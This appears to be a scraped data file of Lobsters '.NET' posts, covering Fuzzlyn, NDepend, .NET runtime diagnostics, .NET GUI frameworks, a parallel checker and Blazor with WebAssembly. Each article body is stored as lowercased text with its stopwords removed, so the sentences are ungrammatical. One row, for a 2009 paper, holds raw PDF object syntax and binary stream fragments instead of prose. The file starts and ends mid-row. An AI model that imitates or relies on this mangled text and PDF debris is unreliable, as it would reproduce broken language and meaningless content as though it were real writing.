bug linux dotnetcoreclr mainly adjusted probability based example looked strived generator produce code looked relatively like human code included going wide range program size way run fuzzlyn stats get view distribution program size output stats every program generated checking bug check behaviour sample diverge release v debug mode tool insert checksumrelated code throughout program example randomly generated method note call checksum function end static sbyte int bool uint uint else ref ushort ref srtchecksum uint short srtchecksum srtchecksum srtchecksum srtchecksum srtchecksum return checksum call allow execution program compared release debug mode single variable different value point execution checksum different also worth pointing roslyn provides inmemory compilation help speed process shellout external process jakob explains additionally since start process every invocation use roslyn inmemory compilation compile check interesting behavior super fast allows reducer really simple dumb still giving great result reducing output however checksum also help fuzzlyn reduce program large initial version something much readable using binary search technique remove section code compare checksum remaining code checksum still differ remaining code contains errorbug fuzzlyn carry reducing otherwise discarded addition fuzzlyn make good use roslyn syntax tree api removing code instance coarsestatementremover class make use roslyn csharpsyntaxwriter class designed allow syntax rewriting also see using csharp syntax rewriter result initially drew fuzzlyn project aside great name impressive result saw getting end aug reported bug already fixed kudos net jit devs fixing quickly list taken project readme uptodate list see github issue created jakobbotsch summary think fuzzlyn fantastic project anything root bug undesired behaviour jit great benefit net developer want see potential sideeffects jit bug take look wait upgrading net nick craver one developer stack overflow could argue code pattern fuzzlyn detects one normally write eg ushort wider point valid c code behaving also ever wrote code horrible time tracking problem everyone know first rule programming always fault select broken ie getting point sure compiler fault could take tried debug problem would go away fuzzlyn find debug v release difference point might begin doubt sanity discus post hacker news rdotnet rcsharp reading jakob kind enough share additional link also asked part fuzzlyn based well known technique implemented scratch somewhere inbetween stateoftheart fuzzing technique unfortunately well suited testing later stage compiler eg code output optimization stage technique example symbolic execution taint tracking input length exploration path slicing problem compiler use many intermediate representation hard cross reference fuzzer passing code executed stage even getting something parse hard without kind knowledge structure need fuzzlyn technique hand fuzzlyn inspired csmith similar tool code written scratch since big difference generating c code csmith c code much complicated generate interesting c code free undefined behavior
238,Lobsters,dotnet,"C#, F#, .NET programming",It’s Doomed; We Can Prove It (2009),https://www.researchgate.net/profile/Martin_Schaef/publication/221268166_It%27s_Doomed_We_Can_Prove_It/links/53e2353e0cf2d79877aa1901/Its-Doomed-We-Can-Prove-It.pdf?origin=publication_detail,doomed prove,,obj goto endobj obj doomed prove endobj obj goto r fit endobj obj length filter flatedecode stream u u dl cm ė z endstream endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r r endobj obj type xobject subtype image width height bitspercomponent colorspace devicegray length filterflatedecode decodeparms stream v endstream endobj obj type annot border hic rect subtypelinka endobj obj type annot border hic rect subtypelinka endobj obj type annot border hic rect subtypelinka endobj obj type annot border hic rect subtypelinka endobj obj type annot border hic rect subtypelinka endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto citecohenetal vccmethodololgy endobj obj type annot border hic rect subtypelinka endobj obj type annot border hic rect subtypelinka endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj font r r r r r r r r r xobject r procset pdf text imageb endobj obj length filter flatedecode stream n 㽈d u ųl endstream endobj obj type page content r resource r mediabox parent r annots r r r r r r r r r endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj r xyz null endobj obj r xyz null endobj obj font r r r r procset pdf text endobj obj length filter flatedecode stream xڭ u k r ȣ ё xt u ɲ ܨ p endstream endobj obj type page content r resource r mediabox parent r annots r r r endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj type annot subtype link border hic rect goto endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj r xyz null endobj obj font r r r r r r r r r procset pdf text endobj obj length filter flatedecode stream xڽ
239,Lobsters,dotnet,"C#, F#, .NET programming",Software Development as an Emergent System,https://www.blinkingcaret.com/2018/08/22/software-development-emergent-system-ndepend/,software development emergent system,boids watch action video code metric bit questionable ndepend ndepend ndepend conclusion,emergent system sometimes described system whole greater sum part personally prefer think emergent system something complex reason whole simple r understand look individual component probably one given example emergent system nature flock bird flying perfect coordination try model bird movement whole becomes difficult convoluted movement make seems almost unpredictable instead model system modeling one bird becomes simple understand done exactly problem modeling behavior flock bird solution called boids boids complex behavior flock bird achieved bird follow three simple rule first one separation state bird try keep reasonable distance bird second rule alignment mean bird try align bird vicinity finally cohesion mean bird try move average position nearby bird impressive lifelike simulation look using three simple rule watch action video good job explaining rule isolation software development software developed individual software system reasonable size becomes hard reason whole unfortunately possible come simple rule allow u predict particular piece software evolve however looking software development perspective surface aspect might help determine software product quality product derail something developer want work one thing come mind initial condition boids example would bird initial position simulation different starting position might lead one big flock multiple individual flock software several thing thought initial condition example type technology used even project initial structure worked large project default mvc structure one folder controller one folder view one folder model web application blindly taken controller folder hundred controller quickly get hand point thing become hard name find pain work aspect implicit boids simulation every bird follows rule perfectly flock would break apart people expected follow rule perfectly especially perfect rule software development however way measure thing going like look flock see breaking apart nudge thing back harmony need able measure health system develop net use visual studio access code metric namely maintainability index cyclomatic complexity depth inheritance line code useful although maintainabilty index may bit questionable however bit limited neither changed added recently discovered tool seems made solve problem called ndepend metric hundred also allows change need even add ndepend ndepend paid extension visual studio trial period analyzes solution time build provides insight form interactive graph dashboard show passingfailing rule rule ndepend similar linq query called cqlinq ndepend cq stand code query available easy read well example rule creates warning method line code name keep method short concise name warn count method method methodnblinesofcode select method see method picked rule click method ndepend take source code find predefined also custom rule ndepend rule explorer panel probably noticed used select method rule definition add additional information returning anonymous object method property extra information want add extra information displayed ui example let add method visibility many method called offending method name keep method short concise name warn count method method methodnblinesofcode select new method methodvisibility methodmethodscalled access information click rule rule explorer even hover returned field get extra information additionally able customize rule displayed define affect project term technical debt namely arbitrary amount time let say think would take average minute fix line line code breaking method smaller method example method want quantified include debt value rule select statement describes name keep method short concise name warnif count method method methodnblinesofcode select new method methodvisibility methodmethodscalled methodnblinesofcode debt methodnblinesofcode tominutes todebt add project overall debt consult ndepend dashboard sample rule mentioned method query assembly type field code created fine tune mean ndepend third party code etc also cherry pick rule want considered case agree also integrate ndepend build server build fail detect something consider serious going achieved set rule named quality gate also customize addremove additionally rule produce graph provide visual insight code base example create code metric view graph show two dimension simultaneously instance number line code loc class cyclomatic complexity loc represented big area class take complexity color see example managecontroller worst class term cyclomatic complexity second largest term line code ndepend graph type use better understand project dependency inheritance hierarchy test code coverage name however allows see one picture project term quality right favorite feature ndepend create baseline see project evolves relation baseline configure dashboard example add remove debt le rule passingfailing highlighted truly feeling seeing direction project going conclusion software development complicated discipline especially consider performed several people working together comparing emergent system useful provides perspective think software something evolves able measure evolution crucial want able tell product building holding term quality also describe tool named ndepend serf exactly purpose far know competitor provides extensive metric allows creation custom rule supporting integration continuous integration workflow related
240,Lobsters,dotnet,"C#, F#, .NET programming",Monitoring and Observability in the .NET Runtime,http://www.mattwarren.org/2018/08/21/Monitoring-and-Observability-in-the-.NET-Runtime/,monitoring observability net runtime,monitoring observability net runtime introduction common language runtime clr fundamental feature secondary feature feature debuggingprofiling rest post look monitoring observability introspection feature core clr provides useful provides diagnostics diagnostic event tracing window clr provides appdomain load event fired exception thrown event gc allocation tick event perf view perfview tool perfview tutorial perfview ultimate net performance tool performance investigation common infrastructure perfview performance tracing linux lttng flamegraphs eventpipe infrastructure crossplatform performance monitoring design net crossplat performance eventing design performance monitoring project eventpipe issue future plan performance profiling controller following functionality via http server rest apis browsable html page runtimes profiling profiling api overview much much image botr page profiling api overview power feature setup hook called every time net method executed nice sample calling convention across different os cpu architecture always easy rewrite il code net method jitted setilfunctionbody api apm tool mock sealed class static method accompanying code icorprofiler api allow rejit attach rejit howto guide vminccorprofidl interface description language profiler execution engine ee ee profiler elt call stub issue linux status coreclr profiler apis profiling v debugging clr debugging v clr profiling debugging wide range different response debugging really managed debugging different nativedebugging managed debugging need abstracted il level available runtime coordinate garbage collector gc higherlevel debugging api botr managed breakpoints work icordebug api clr debugging brief introduction so icordebug partition icordebug toplevel callback process code type inspection execution control thread callstacks object inspection solution linux arm managed debugging diagnostic debugging net core linux lldb diagnostics repository wrapper included clrmd library available callback so dac botr page son strike so extension quick aside stack overflow answer so command so upcoming release new command heapstat so link so link so link shared link dac link shared link dac link party debugger memory dump creating memory dump window os cli tool analysing memory dump clr md library previously written clrheap gc root clr thread stack frame much implement so command announcement post wide range tool summary net runtime provides widerange diagnostic debugging profiling feature allow deepinsight going inside clr hackernews rprogramming rcsharp reading general etw event perfview profiling api debugging memory dump,monitoring observability net runtime aug word net managed runtime mean provides highlevel feature manage program introduction common language runtime clr written runtime many feature useful categorize follows fundamental feature feature broad impact design feature include garbage collection memory safety type safety high level support programming language secondary feature feature enabled fundamental feature may required many useful program program isolation appdomains program security sandboxing feature feature runtime environment need leverage fundamental feature clr instead result desire create complete programming environment among versioning debuggingprofiling interoperation see debuggingprofiling whilst fundamental secondary feature still make list desire create complete programming environment rest post look monitoring observability introspection feature core clr provides useful provides make easier navigate post split main section extrareading material end diagnostics firstly going look diagnostic information clr provides traditionally supplied via event tracing window etw quite wide range event clr provides related garbage collection gc justintime jit compilation module appdomains threading lock contention much example appdomain load event fired exception thrown event gc allocation tick event perf view want see etw event coming net program recommend using excellent perfview tool starting perfview tutorial excellent talk perfview ultimate net performance tool perfview widely regarded provides invaluable information instance microsoft engineer regularly use performance investigation common infrastructure however case clear name etw event available window really fit new crossplatform world net core use perfview performance tracing linux via lttng cmdline collection tool known perfcollect analysis rich ui includes flamegraphs currently window want analyse net performance linux approach link discus new eventpipe infrastructure worked net core along eventsources eventlisteners spot theme see aim crossplatform performance monitoring design highlevel provide single place clr push event related diagnostics performance event routed one logger may include etw lttng bpf example exact logger determined osplatform clr running also background information net crossplat performance eventing design explains proscons different logging technology work done event pipe tracked performance monitoring project associated eventpipe issue future plan finally also future plan performance profiling controller following goal controller responsible control profiling infrastructure exposure performance data produced net performance diagnostics component simple crossplatform way idea expose following functionality via http server pulling relevant data event pipe rest apis pri simple profiling profile runtime x amount time return trace pri advanced profiling start tracing along configuration pri advanced profiling stop tracing response calling trace pri get statistic associated eventcounters specified eventcounter browsable html page pri textual representation managed code stack process provides snapshot overview currently running use simple diagnostic report pri display current state potentially history eventcounters provides overview existing counter value open issue believe necessary public apis present enumerate eventcounters excited see performance profiling controller ppc go think really valuable net builtin clr something runtimes profiling another powerful feature clr provides profiling api mostly used party tool hook runtime lowlevel find api overview highlevel allows wire callback triggered gcrelated event happen exception thrown assembly loadedunloaded much much image botr page profiling api overview addition power feature firstly setup hook called every time net method executed whether runtime user code callback known enterleave hook nice sample show use however make work need understand calling convention across different os cpu architecture always easy also warning profiling api com component accessed via cc code use c f vbnet secondly profiler able rewrite il code net method jitted via setilfunctionbody api api hugely powerful form basis many net apm tool learn use previous post mock sealed class static method accompanying code icorprofiler api turn runtime perform sort crazy trick make profiling api work look went pr allow rejit attach info rejit see rejit howto guide overall definition profiling api interface callback found vminccorprofidl see interface description language divided logical part one profiler execution engine ee interface known asicorprofilerinfo declaration class implement icorprofilerinfo interface allow profiler communicate ee allows profiler dll get access private ee data structure thing never exported outside ee implemented following file main part ee profiler callback grouped together icorprofilercallback interface module implement wrapper around calling profiler icorprofilercallaback interface code ee need call profiler go eetoprofinterfaceimpl callback implemented across following file finally worth pointing profiler apis might work across os cpuarchs net core run eg elt call stub issue linux see status coreclr profiler apis info profiling v debugging quick aside profiling debugging overlap helpful understand different apis provide context net runtime clr debugging v clr profiling debugging debugging mean different thing different people instance asked twitter way debugged net program got wide range different response although set response contain really good list tool technique worth checking thanks lazyweb perhaps quote best sum debugging really clr provides extensive range feature related debugging need provide service excellent post managed debugging different nativedebugging provides reason native debugging abstracted hardware level managed debugging need abstracted il level managed debugging need lot information available runtime managed debugger need coordinate garbage collector gc give decent experience clr provide higherlevel debugging api known icordebug shown image common debugging scenario botr addition nice description different part interact managed breakpoints work overview pipeline component enduser debugger visual studio mdbg clr debugging service call right side implementation icordebug mscordbidll process boundary debugger debuggee clr mscorwksdll contains inprocess portion debugging service call left side communicates directly r stage debuggee code end user c program icordebug api implemented different component clr debugging brief introduction net debugging support implemented top dll call dac file usually named mscordacwksdll building block public debugging api icordebug well two private debugging apis sosdac api ixclr perfect world everyone would use icordebug public debugging api however vast majority feature needed tool developer lacking icordebug problem fixing improvement go clr vnext older version clr fact icordebug api added support crash dump debugging clr anyone debugging clr crash dump use icordebug additional writeup see so icordebug icordebug api actually split multiple interface list show category fall info see partition icordebug list came go much detail toplevel icordebug toplevel interface effectively serve collection icordebugprocess object callback managed debug event dispatched via method callback object implemented debugger process set interface represents running code includes apis related eventing code type inspection could mostly operate static pe image although convenience method live data execution control execution ability inspect thread execution practically mean thing like placing breakpoints stepping stepin stepover stepout icordebug execution control operates within managed code thread callstacks callstacks backbone debugger inspection functionality following interface related taking callstack icordebug expose debugging managed code thus stack trace managedonly object inspection object inspection part api let see value variable throughout debuggee interface list mvp method think must succinctly conveys purpose interface one note profiling apis level support debugging api varies across o cpu architecture instance aug solution linux arm managed debugging diagnostic info linux support general see great post debugging net core linux lldb checkout diagnostics repository microsoft goal making easier debug net program linux finally want see icordebug apis look like c take look wrapper included clrmd library include available callback clrmd covered depth later post so dac data access component dac discussed detail botr page essence provides outofprocess access clr data structure internal detail read another process allows debugger via icordebug son strike so extension reach running instance clr memory dump find thing like running thread object managed heap full information method including machine code current stack trace quick aside want explanation strange name bit net history lesson see stack overflow answer full list so command quite impressive using alongside windbg allows lowlevel insight going program clr see implemented let take look heapstat command give summary size different heap net gc using image so upcoming release new command heapstat code flow showing so dac work together so full heapstat command link so code heapstat command deal workstation gc link so gcheapusagestats function heavylifting link shared dacpgcheapdetails data structure contains pointer main data gc heap segment card table individual generation link dac getgcheapstaticdata function fillsout dacpgcheapdetails struct link shared dacpheapsegmentdata data structure contains detail individual segment gc heap link dac getheapsegmentdata fillsout dacpheapsegmentdata struct link party debugger microsoft published debugging api allowed party make use use icordebug interface list come across memory dump final area going look memory dump captured live system analysed offline net runtime always good support creating memory dump window net core crossplatform also tool available os one issue memory dump tricky get hold correct matching version so dac file fortunately microsoft released dotnet symbol cli tool download file needed debugging symbol module so dac coreclr module given given core dump minidump supported platform file format like elf macho window dlls pdbs portable pdbs finally spend length time analysing memory dump really take look excellent clr md library microsoft released year ago previously written nutshell allows interact memory dump via intuitive c api class provide access clrheap gc root clr thread stack frame much fact aside time needed implemented work clr md could implement so command work announcement post clrmd managed library wrapper around clr internalonly debugging apis although internalonly apis useful diagnostics support public documented release incredibly difficult use tightly coupled implementation detail clr clrmd address problem providing easytouse managed wrapper around lowlevel debugging apis making apis available officially supported library microsoft enabled developer build wide range tool top clrmd great result summary net runtime provides widerange diagnostic debugging profiling feature allow deepinsight going inside clr discus post hackernews rprogramming rcsharp reading appropriate included additional link cover topic discussed post general etw event perfview profiling api debugging memory dump
241,Lobsters,dotnet,"C#, F#, .NET programming",The State of .NET GUI Frameworks,https://sietch.net/ViewNewsItem.aspx?NewsItemID=271,state net gui framework,traditional desktop window form window presentation foundation wpf mobilefriendly universal window platform uwp xamarin upcoming desktop avalonia avalonia fully opensource effort upcoming mobilefriendly uno platform uno uno browser demo bf wp master upcoming web bridgenet bridgenet c xaml jsil blazor blazor frogui frogui honorable mention script script update gtk gtk qmlnet qmlnet qt etoforms eto conclusion,gui development c fallen sideline recent year main reason rise mobile platform fact traditional c gui tool focus window said see resurgence interest net based gui framework interesting experimental stage sheer amount interest reaction community make believe least one make productionready state see significant use industry completeness list older framework note experience win form wpf uwp information framework may correct addition experimental framework probably see significant development coming month may even stop development future make sure look current status project btw flying car yet web assembly make traditional desktop traditional net framework one created time window reigned supreme mature maintained keep new window feature expect much term new feature window form original gui framework net extremely easy use best gui designer history achieve win form sacrifice responsive ui paradigm ui reflow app resized concept like docking require quite bit effort windowsonly general care work mono linux mac win form still preferred framework developing internal tool need gui also great teaching almost pure oop every control defined net class designer tool generates actual c show student win form designerwindows presentation foundation wpf released mid designed replace win form wpf heavy artillery full concept support powerful responsive ui quite steep learning curve wpf ui defined xaml gui designer exists people find easier write xaml hand use designer preview visual studio written wpf fair see use case wpf day used guiheavy windowsonly apps see lot new software kind expect wpf work operating system hard relies directx windowsonly tech chance ever ported slim wpf designer win form wpf supported net core windowsonly package wo nt make crossplatform bring development goodness framework example able package app required framework version net framework installation requiredmobilefriendly framework category productionready widely used officially supported microsoft focus mainly mobile control suitable different screen size touchthe universal window platform uwp uwp apps microsoft push future window ui couple year uwp gui written xaml step shoulder wpf silverlight rip sweet prince uwp apps work without change window window mobile find one xbox hololens provided require exclusive platform feature like phone call layout control come uwp prepared scale form factor accept input touch mouse controller even hovering finger air hololens would great current microsoft ceo sideline microsoft client platform killing phone kinect bunch clientfocused service result demand uwp apps practically xamarin allows developer create gui native tool io android write code driving ui logic app c since microsoft aquired xamarin company xamarin framework free xamarin provides library called xamarin form used create crossplatform ui library also support uwp personally used xamarin opinion people vary wildly buggy basically unusable work like charm problem guess depends kind ui building xamarin also support building apps mac o publishing mac app store xamarin form us subset xaml nonforms ui done platform native toolsupcoming desktopavalonia avalonia aim provide crossplatform alternative wpf sits top net core mono communitydriven fully opensource effort seems idea avalonia desktopfirst framework although experimental support io android nt experimented avalonia looking documentation seems aspect simplified compared wpf good thing avalonia aim compatibility wpf expect copypaste code wpf application current status beta according documentation quite feature rich already team keep good work good chance become de facto desktop framework c similar qt de facto desktop framework c ideal world avalonia able challenge electron plague ravaging desktop application development finger crossedupcoming mobilefriendlyuno platform uno uno aim bring uwp io android platform provides apis xaml support uwp apps top xamarin platform addition translate web assembly run browser browser demo slow load work reasonable speed live edit xaml see result side main goal android io web assembly work seems future thing uno probably ambitious project one listed aim compatibility uwp uno success turn uwp success bit sceptical result thing work expect reaction people xamarin ranging great total crap uno advertizes window first development approach basically develop debug uwp goodness microsoft provides like edit continue check work io android use platform specific feature implement platform specific ui uno go shared project model one project target platform shared project use scheme used share code window phone window back winrt day think quite good find time intend port bf wp uwp use uno port io android work try porting master time uno architectureupcoming webbridgenet bridgenet essentially c j compiler levereges roslyn goodness provide quality compiler use typescript definition file provide type information j library compiler personally big fan compile j approach probably best way web c today assume integrating existing j library project easier integrating project people behind bridgenet put lot effort porting good portion net framework use standard library know love go bridgenet route ui language html c xaml allows compile xaml c j far know us jsil compile il code javascript contrast bridgenet generates j directly c also provides implementation xaml html seems like project best suited porting existing wpf silverlight solution portable web reservation project compile j still standblazor blazor aim provide ability program browser using c insted j unlike bridgenet compile c j us pipeline based mono compile c web assembly supposedly result le leaky abstraction better performance microsoft funding development cautious call experiment project seems traction community compared upcoming project blazor ui language html cs come reactlike framework us razor templating language addition full client side rendering blazor support form server side rendering snippet html sent web socket client useful electron application running tandem net core latency client server use actual net core logic use web tooling rendering hope future add real serverside rendering allows server ship html initial page load method used ssr tool react angular vue allow c devs real fullstack c interoperability j library somewhat complex one provided bridgenet still quite reasonable doable opinion comping project blazor best chance success microsoft behind impressive traction community addition le ambitious project aiming bring xaml nonwindows platform mean encounter le technical problem manage find time intend port website blazor time pay someone proper designcss promisefrogui frogui compiles c code web assembly using monobased pipeline blazor uno targeting web assembly use aim provide set ui control render html svg ui language supposed c used form dsl proper api constructing ui gui designer work similar win form also roadmap control layout inspired wpf project earlier stage development compared others mentioned quite ambitious make bit skeptical certainly happy see ui declared c designing good api easy task even done still rendering underlying html must done properly minimum abstraction leak theory starting clean xaml razor j may provide best result massive work required make shipping producthonorable mention script first project attempt compiling c j used production script think currently abandoned one point used large project like outlookcom today probably use bridgenet achieve goal script built time roslyn way impressive achievement show desire c devs avoid writing javascript length go achieve least decade old far know script single person effort quite leaky abstraction still many people adopted think javascript bad sacrifice worth itupdate since published article people pointed project missedgtk gtk set binding popular gtk ui framework net reason thought old project way seems like healthy state come xmlbased design tooling called glade opinion glade xml look worse option layout language gtk used still used tool mono including monodevelopvisual studio mac wonder solution popular gtk definitely desktop framework mobile seem goalqmlnet qmlnet enables net developer use qt gui library net project together qml ui language qml look nice includes minor use javascript documentation mention use chrome javascript engine make feel uneasy somehow think bringing javascript engine app draw ui github page fail understand qmlnet support anything desktop development right nowetoforms eto odd ui framework fail understand completely seems eto control fact wrapper wpf gtk win form control allows build somewhat portable ui using eto ui different apps seem designer tool control defined code project seems mature qmlnet uno frogui blazor eto io android version still readyconclusion definitely increasing interest modernizing c frontend development mean desire write gui c instead j definitely many project expect least one become significant success accumulate needed support large company community knowhow web assembly particular give rise many nonjs framework targetting browser good see c community forefront effort guess disdain javascript strongest
242,Lobsters,dotnet,"C#, F#, .NET programming",Parallel Checker,http://parallel-checker.com/,parallel checker,overview highlight new try checker online try new nuget analyzer v code may version released academic publication,overview hsr parallel checker static analyzer visual v code detects data race deadlock concurrency issue c highlight static find issue hard identify test fast take second even large project precise detects real issue occur indeed runtime interactive highlight issue coding visual v code ide new try checker online experiment parallel checker directly website try web version enabled net mono webassembly crosscompilation new nuget analyzer v code hsr parallel checker also available nuget package conveniently used v code integrated development environment may version released updated version hsr parallel checker released support c downwards visual studio onwards including v preview academic publication checker algorithm design implementation described academic publication l bläser practical detection concurrency issue coding time international symposium software testing analysis issta amsterdam netherlands acm digital library july notice microsoft visual studio visual basic either registered trademark trademark microsoft corporation united state andor country trademark trade name etc property respective owner hsr hsr parallel checker contributor affiliation mentioned trademark holder
243,Lobsters,dotnet,"C#, F#, .NET programming",Web Assembly and Blazor: Re-assembling the Web,https://weblog.west-wind.com/posts/2018/Jul/31/Web-Assembly-and-Blazor-Reassembling-the-Web,web assembly blazor reassembling web,code magazine time reassembling web web assembly new silverlight figure figure web assembly module wasm platformagnostic byte code compiled native code blazor one way net web blazor framework mono figure javascript net net javascript figure caveat emptor experimental stage blazor html framework overhead web assembly limitation performance nt expect performance miracle even performance par modern javascript framework thing changin blazor intended production use yet web assembly figure figure mozilla mdn byte code representation native execution intermediate representation blazor http githubcomappcypherawesomewasmlangs web assembly limitation access html dom apis numeric parameter return value blazor browser based razor page razor browser behind scene us blazor look like well known razor syntax layout blazor page class icomponent c code input data binding event list iteration databinding refreshes external class dependency injection accessing nuget package westwindutilities blazor work figure figure compiled figure figure generated figure figure missing piece experimental production code change debugging net standard date oh javascript date web assembly dom blazor one way implement framework top web assembly painfully slow progress ooui uno downside web assembly growing pain experimental software viable blazor web spa framework web infrastructure get away first comment muhammed build without fear integration microsoft v microsoft even open source summary really like,post contains contains subset forthcoming code magazine article septemberoctober issue web powered single language client since beginning web platform javascript started overly simplified scripting language first netscape browser slowly evolved year become widely used programming language anywhere lot changed recent year javascript gotten lot powerful many much needed improvement added later well improvement build tool made possible build manage even large code base unfortunately evolution also resulted ever complex build process byzantine build system javascript seems simpler programming model get complex build system tooling becomes time lot developer would much rather use something else anything else javascript build web application made peace javascript year ago use daily feel reasonably proficient would definitely welcome option build web application sure would nice break javascript monoculture web development last year nt language either javascript insane build system required major framework day house card seems break anytime step away day platform skinned cat potentially efficient way easier integrated without brittleness seems come part parcel javascript development reassembling web emergence web assembly starting bear fruit change javascript monoculture opened possibility compile code nt necessarily javascript low level byte code web assembly module wasm web browser directly execute without parse source file web assembly allows exploring alternative javascript syntax different build process eye lack alternative led u path ever increasing complexity piling abstraction dependency web assembly potential break stranglehold providing different model approach web development open browser platform way probably nt even imagined yet web assembly parallel technology javascript exists side side javascript runtime web browser runtime also share browser sandbox security context unlike plugins old web assembly ca nt access computer hardware o feature web assembly new silverlight respect web assembly relies browser runtime javascript relies figure web assembly sits side side javascript figure show javascript web assembly processed rather parsing javascript executable code web assembly module wasm contain lower level assemblylanguage like intermediate code produced compiler language wasm code nt need parsed like javascript since already byte code resolved execution ready code wasm binary code format deal instruction stack memory level push thing onto stack call operation perform arithmetic operation call function pointer stack set pas value platformagnostic byte code compiled native code appropriate computer platform arm executed specific browser platform advantageous creating high performance computational code highly optimized performance execute considerably faster javascript term initial load time runtime execution blazor one way net web even interesting performance possibility using web assembly bootstrap higher level runtimes execute higher level language like net code exactly approach microsoft blazor framework take blazor us mono compiled version net runtime compiled wasm module execute net standard code shown figure monowasm browser customized version mono net runtime compiled web assembly wasm module allows bootstrapping net standard assembly execution net code blazor sits top core runtime implement razor engine used entry point net code processed inside razor page addition blazor also support javascript net net javascript interop way blazor javascript framework system feature using mono blazor way thing normally net importing referencing additional net standard assembly instantiate class execute code figure blazor us mono runtime execute net code browser apis currently accessed javascript interop currently blazor us mono interpreter net code essentially allows loading execution net dll assembly rather compiling every bit net code application run wasm mono runtime precompiled wasm module mono handle execution net code loaded net standard assembly sound incredibly complicated developer perspective building application process actually surprisingly simple create razor page component c code inside work way would expect blazor hide complexity runtime bootstrapping net code execution provides familiar net razor page like development experience run entirely inside browser client side even reference third party assembly via nuget take advantage large chunk net clr functionality pretty impressive see work caveat emptor get swept away cool prospect running net code browser blazor still considered experimental stage work functionally show lot promise also number limitation current stage blazor html framework blazor specific use case namely html framework similar something like angular vue etc rendering razor page client side generic engine execute net code browser net code execute tightly coupled blazor framework possible via mono wasm runtime blazor meant generic net runtime engine html framework runtime feature exposed via javascript interop side effect required internals framework special case need interact javascript net code overhead overhead magic blazor provides load sizable wasm module plus javascript loader interop handler code loaded browser application outrageously large especially compared full spa framework like angular ember aurelia payload small loaded startup initial test simple sample app loading loading code content first load currently blazor app code compiles single assembly take load hit entire app startup startup speed currently noticeably slow likely change especially promise ahead time compilation aot come fruition promise compile code actually reference native wasm module directly executed would likely use similar technnology corert tree shaking compiler output code actually application clr user code possibility produce small output new javascript framework today via webpack important aspect web application different load requirement server desktop application web assembly limitation also limitation web assembly web assembly currently support direct dom browser api access instead wasm rely javascript interop update dom browser apis like canvas svg webgl even built apis like history location localstorage etc require javascript interop today fast comparison native wasm compiled code data support parameter return value also limited number pointer moment requires additional conversion order pas string reference javascript web assembly performance result early version blazor nt expect performance miracle even performance par modern javascript framework change web assembly get better dom integration typereference support future mono team continues work optimizing wasm version mono runtime also many optimization made razor stack prerendering already worked blazor nt preview release yet early blazor worrying performance point proving model viable platform building complete web application given early stage feature functionality impressive even performance yet thing changin good news blazor mono changing quickly expect rapid improvement front mono blazor team amazing work making improvement kicking ball forward bad news web assembly part spec process nt expect change come rapidly front needed improvement domapi access reference type support worked currently official arrival date crucial feature could improve performance significantly short early day web assembly blazor microsoft explicitly state blazor intended production use yet likely lot infrastructure syntax going change significantly future warned web assembly key everything described executing nonjavascript code browser using web assembly web assembly relatively new browser tech supported latest version major browser shown figure notable internet explorer supported web assembly blazor moment figure web assembly support web browser source mozilla mdn web assembly general fallback mechanism via asmjs polyfill essentially allows wasm module execution via code based compiler execution engine via browser feature detection code switch asmjs based execution v native web assembly execution blazor support currently appears work nt able get ie run sample app byte code representation native execution web assembly module wasm created compiler target wasm output target today common wasm compilation platform cc using emscripten llvm processor output wasm byte code languges supported net among currently via mono blazor us mono interpreter implementation load standard net dlls browser executes runtime interpreted mode also work process mono produce static ahead time aot compilation net code wasm although currently blazor us different approach use mono hosted runtime via wasm executeinterpret net code runtime wasm module consist binary content called intermediate representation ir assemblylike byte code low level byte code loaded compiled web assembly loader processor specific native code executed browser vm ir code processoragnostic job web assembly engine create appropriate arm native code specific browser vm execute wasm module loaded javascript browser using set webassembly specific apis eventually goal able load wasm module using script src myappwasm type module script syntax loaded module using module loader used ecmascript later providing export functionality exposed module blazor use nt really matter web assembly interaction performed internally blazor javascript framework responsible loading mono wasm module interactive via javascript shim blazor application code nt touch web assembly directly one original use case web assembly high performance c built module called javascript execute many time faster code javascript performance good reason web assembly another great use case build framework facilitate hosting language runtimes inside browser blazor use net one example using mono net runtime browser allow loading executing code net standard assembly many language taking similar approach see http githubcomappcypherawesomewasmlangs advent webassembly browser runtimes load run two type code javascript webassembly side side technology web assembly limitation certainly sound promising web assembly relatively new browser technology current state couple big limitation access html dom apis currently web assembly way directly access browser dom apis order interact html page content canvas browser api web assembly use interop javascript function inside wasm essentially selfcontained block code isolated environment hosted think static function dependency passed maintained within internal context javascript interop required access dom apis numeric parameter return value web assembly function currently support numeric type parameter support string reference nonnumeric type type data passed web assembly function via pointer array buffer real world mean lot serialization copying data done move data javascript web assembly issue pretty major slow workarounds extra code gymnastics interop javascript via shim issue abstracted hidden framework like blazor interop performance tax real issue issue well known addressed future version web assembly current framework work around issue using javascript interop type conversion blazor browser based razor page blazor framework sits top web assembly get name using razor template browser behind scene blazor us single web assembly module wasm targeted version mono net runtime mono flavor net runtime underlies various xamarin platform well many flavor linux mac small device wasm yet another custom target mono runtime allows execution net standard assembly code mono wasm version customized kept small possible browser environment important understand mono leverage browser runtime provide net runtime functionality mean many thing painful javascript like date floating point math nt magically fixed running net cover mono us runtime work core limitation build top blazor bootstrapped part main component app typically embedded launch page similar way framework like angular blazor app main function startup method much like aspnet core app configure dependency injection service configure startup environment fired initial app model loaded html page one thing understand blazor first foremost html framework generic net execution engine core feature blazor component based html framework somewhat akin javascript framework like angular aurelia ember blazor provides familiar net experience building razor page like razor server blazor page parsed c class executed mono runtime although blazor closely tied razor model operation razor html template component reference net code loose class create part project assembly project solution assembly nuget package add application mean quite easy break 